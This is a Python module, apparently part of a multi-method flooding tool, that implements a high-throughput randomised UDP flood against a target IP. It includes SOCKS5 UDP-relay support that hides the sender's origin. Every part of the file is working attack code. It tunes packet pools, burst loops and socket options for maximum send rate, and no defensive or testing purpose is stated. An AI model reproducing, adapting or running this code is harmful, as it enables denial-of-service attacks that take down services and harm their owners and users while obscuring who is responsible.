"""
Method B — Randomised UDP Flood (max throughput, optional SOCKS5 proxy)

Per-packet randomisation:
  • random destination port  (from pre-built pool)
  • random payload size      (from pre-built pool, built with os.urandom)
  • optional random delay    (controlled by configb.B_MAX_DELAY; 0 = full speed)

Proxy support:
  • Pass socks5://[user:pass@]host:port in WorkerArgs.proxy
  • Each worker holds one persistent SOCKS5 UDP ASSOCIATE connection
  • Packets are wrapped in the SOCKS5 UDP header before relay
  • Falls back to direct socket if SOCKS5 setup fails

Performance tricks:
  • os.urandom() for payloads — kernel speed, no Python loops
  • Pre-built pool of (wrapped_payload, addr) pairs — zero per-packet random calls
  • sock.sendto bound as local — eliminates attribute lookup overhead
  • time.time() checked every BURST packets, not every send
  • Delay path compiled out when B_MAX_DELAY == 0
"""

import os
import socket
import struct
import random
import time
import logging
from urllib.parse import urlparse

import config
import configb
from methods.base import WorkerArgs

logger = logging.getLogger(__name__)

_POOL_SIZE = 256   # pre-built (payload, addr) pairs — must be power of 2
_BURST     = 512   # packets between time.time() checks
_MASK      = _POOL_SIZE - 1


# ── SOCKS5 UDP ASSOCIATE ──────────────────────────────────────────────────────

def _socks5_udp_setup(proxy_url: str, target_ip: str):
    """
    Connect to a SOCKS5 proxy, perform UDP ASSOCIATE, and return:
        (tcp_socket, relay_addr)
    tcp_socket must remain open for the lifetime of the flood.
    relay_addr is the (host, port) to send wrapped UDP packets to.
    """
    p          = urlparse(proxy_url)
    proxy_host = p.hostname
    proxy_port = p.port or 1080
    username   = p.username
    password   = p.password

    tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    tcp.settimeout(10)
    tcp.connect((proxy_host, proxy_port))

    # Greeting — advertise username/password auth if credentials present
    if username:
        tcp.sendall(b'\x05\x01\x02')
    else:
        tcp.sendall(b'\x05\x01\x00')

    resp = tcp.recv(2)
    if len(resp) < 2 or resp[0] != 5:
        raise ValueError(f"Not a SOCKS5 proxy ({proxy_url})")

    if resp[1] == 0x02:
        creds = (bytes([1, len(username)]) + username.encode() +
                 bytes([len(password)]) + password.encode())
        tcp.sendall(creds)
        auth_resp = tcp.recv(2)
        if auth_resp[1] != 0:
            raise ValueError(f"SOCKS5 auth failed ({proxy_url})")
    elif resp[1] != 0x00:
        raise ValueError(f"SOCKS5 unsupported auth method {resp[1]} ({proxy_url})")

    # UDP ASSOCIATE — DST.ADDR/PORT = 0 (proxy decides)
    tcp.sendall(b'\x05\x03\x00\x01\x00\x00\x00\x00\x00\x00')
    resp = tcp.recv(10)
    if len(resp) < 10 or resp[1] != 0:
        raise ValueError(f"SOCKS5 UDP ASSOCIATE failed: code {resp[1] if len(resp)>1 else '?'}")

    relay_ip   = socket.inet_ntoa(resp[4:8])
    relay_port = struct.unpack('!H', resp[8:10])[0]

    # Some proxies return 0.0.0.0 — use proxy host instead
    if relay_ip == '0.0.0.0':
        relay_ip = proxy_host

    tcp.settimeout(None)
    return tcp, (relay_ip, relay_port)


def _socks5_udp_wrap(target_ip: str, target_port: int, data: bytes) -> bytes:
    """Prepend SOCKS5 UDP header: RSV(2) FRAG(1) ATYP(1) ADDR(4) PORT(2) DATA."""
    return (b'\x00\x00\x00\x01' +
            socket.inet_aton(target_ip) +
            struct.pack('!H', target_port) +
            data)


# ── Worker ────────────────────────────────────────────────────────────────────

def worker(args: WorkerArgs):
    """
    Runs inside a multiprocessing.Process.
    If args.proxy is set, routes all traffic through SOCKS5 UDP ASSOCIATE.
    Otherwise, uses a direct UDP socket.
    """
    use_proxy  = bool(args.proxy)
    tcp_keepalive = None   # SOCKS5 TCP control socket (must stay open)
    relay_addr    = None

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    try:
        sock.setsockopt(socket.SOL_SOCKET, config.SO_REUSEPORT, 1)
    except OSError:
        pass

    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, config.SEND_BUFFER)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 0)

    if use_proxy:
        try:
            tcp_keepalive, relay_addr = _socks5_udp_setup(args.proxy, args.target_ip)
            logger.info(f"[worker {args.worker_id}] SOCKS5 relay → {relay_addr}")
        except Exception as e:
            logger.warning(f"[worker {args.worker_id}] Proxy setup failed, going direct: {e}")
            use_proxy = False

    # ── Pre-build pool ────────────────────────────────────────────────────────
    if use_proxy:
        # Wrap each payload with SOCKS5 UDP header + random dst port baked in
        pool = []
        for _ in range(_POOL_SIZE):
            raw  = os.urandom(random.randint(configb.B_MIN_PACKET_SIZE, configb.B_MAX_PACKET_SIZE))
            port = random.randint(configb.B_MIN_PORT, configb.B_MAX_PORT)
            pool.append((_socks5_udp_wrap(args.target_ip, port, raw), relay_addr))
    else:
        pool = [
            (
                os.urandom(random.randint(configb.B_MIN_PACKET_SIZE, configb.B_MAX_PACKET_SIZE)),
                (args.target_ip, random.randint(configb.B_MIN_PORT, configb.B_MAX_PORT)),
            )
            for _ in range(_POOL_SIZE)
        ]

    sendto      = sock.sendto
    use_delay   = configb.B_MAX_DELAY > 0
    end_time    = time.time() + args.duration
    local_count = 0
    idx         = random.randint(0, _POOL_SIZE - 1)

    try:
        if use_delay:
            while time.time() < end_time:
                for _ in range(_BURST):
                    payload, addr = pool[idx & _MASK]
                    idx += 1
                    try:
                        sendto(payload, addr)
                        local_count += 1
                    except Exception:
                        pass
                    time.sleep(random.uniform(configb.B_MIN_DELAY, configb.B_MAX_DELAY))
        else:
            while time.time() < end_time:
                for _ in range(_BURST):
                    payload, addr = pool[idx & _MASK]
                    idx += 1
                    try:
                        sendto(payload, addr)
                        local_count += 1
                    except Exception:
                        pass
    finally:
        with args.counter_lock:
            args.packets_sent.value += local_count
        sock.close()
        if tcp_keepalive:
            try:
                tcp_keepalive.close()
            except Exception:
                pass
